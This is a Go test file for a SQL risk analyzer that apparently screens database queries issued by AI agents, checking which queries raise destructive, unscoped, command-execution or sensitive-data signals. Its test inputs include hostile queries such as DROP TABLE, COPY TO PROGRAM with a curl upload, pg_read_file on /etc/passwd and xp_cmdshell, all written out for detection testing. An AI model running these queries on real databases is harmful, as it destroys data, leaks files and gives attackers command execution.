package risk

import (
	"testing"

	"github.com/princebabou/Latch/pkg/models"
)

func TestSQLAnalyzerSeparatesExecutableSyntaxFromData(t *testing.T) {
	tests := []struct {
		name      string
		query     any
		want      []string
		doNotWant []string
	}{
		{
			name:  "destructive statement after comment",
			query: "-- maintenance\n DROP TABLE users",
			want:  []string{"destructive-database-query"},
		},
		{
			name:  "delete in CTE",
			query: "WITH candidates AS (SELECT id FROM jobs WHERE stale = true) DELETE FROM jobs WHERE id IN (SELECT id FROM candidates)",
			want:  []string{"destructive-database-query"},
		},
		{
			name:  "data modifying CTE",
			query: "WITH deleted AS (DELETE FROM sessions RETURNING *) SELECT * FROM deleted LIMIT 1",
			want:  []string{"destructive-database-query", "unscoped-database-mutation"},
		},
		{
			name:      "dangerous words inside literal are data",
			query:     "SELECT 'DROP TABLE users', note FROM messages LIMIT 1",
			doNotWant: []string{"destructive-database-query"},
		},
		{
			name:      "dangerous words inside comment are ignored",
			query:     "SELECT id FROM users /* DROP TABLE users */ LIMIT 1",
			doNotWant: []string{"destructive-database-query"},
		},
		{
			name:  "MySQL executable comment is analyzed",
			query: "/*!50000 DROP TABLE audit_log */",
			want:  []string{"destructive-database-query"},
		},
		{
			name:  "unscoped update",
			query: "UPDATE users SET active = false",
			want:  []string{"unscoped-database-mutation"},
		},
		{
			name:      "scoped update",
			query:     "UPDATE users SET active = false WHERE id = 7",
			doNotWant: []string{"unscoped-database-mutation"},
		},
		{
			name:  "unbounded wildcard projection",
			query: "SELECT users.* FROM users",
			want:  []string{"unbounded-database-query"},
		},
		{
			name:      "aggregate wildcard is not a wildcard projection",
			query:     "SELECT count(*) FROM users",
			doNotWant: []string{"unbounded-database-query"},
		},
		{
			name:      "bounded wildcard projection",
			query:     "SELECT * FROM users LIMIT 25",
			doNotWant: []string{"unbounded-database-query"},
		},
		{
			name:  "database command execution",
			query: "COPY results TO PROGRAM 'curl https://example.test/upload'",
			want:  []string{"database-command-execution"},
		},
		{
			name:  "database file access",
			query: "SELECT pg_read_file('/etc/passwd')",
			want:  []string{"database-file-access"},
		},
		{
			name:  "quoted sensitive identifier",
			query: `SELECT "password_hash" FROM users LIMIT 1`,
			want:  []string{"sensitive-database-column"},
		},
		{
			name:      "sensitive word inside literal",
			query:     "SELECT 'password' AS category LIMIT 1",
			doNotWant: []string{"sensitive-database-column"},
		},
		{
			name:  "multiple statements outside literal",
			query: "SELECT 1; DELETE FROM users WHERE id = 7",
			want:  []string{"multi-statement-query", "destructive-database-query"},
		},
		{
			name:      "semicolon inside literal",
			query:     "SELECT 'one;two' AS value LIMIT 1",
			doNotWant: []string{"multi-statement-query"},
		},
		{
			name:  "malformed SQL fails closed",
			query: "SELECT * FROM users WHERE name = 'unfinished",
			want:  []string{"sql-parse-ambiguity"},
		},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			_, signals := Analyze(models.Action{
				AgentID: "test", Tool: "database.query", Operation: "query",
				Arguments: map[string]any{"query": test.query},
			})
			names := riskSignalNames(signals)
			for _, wanted := range test.want {
				if !names[wanted] {
					t.Fatalf("signals = %#v, want %q", signals, wanted)
				}
			}
			for _, unwanted := range test.doNotWant {
				if names[unwanted] {
					t.Fatalf("signals = %#v, do not want %q", signals, unwanted)
				}
			}
		})
	}
}

func TestSQLCommandExecutionAndUnscopedMutationAreHardDenies(t *testing.T) {
	for _, query := range []string{
		"UPDATE users SET admin = true",
		"EXEC xp_cmdshell 'whoami'",
	} {
		_, signals := Analyze(models.Action{
			AgentID: "test", Tool: "database.query", Operation: "query",
			Arguments: map[string]any{"query": query},
		})
		if len(HardDeny(signals)) == 0 {
			t.Fatalf("signals = %#v, want hard deny", signals)
		}
	}
}
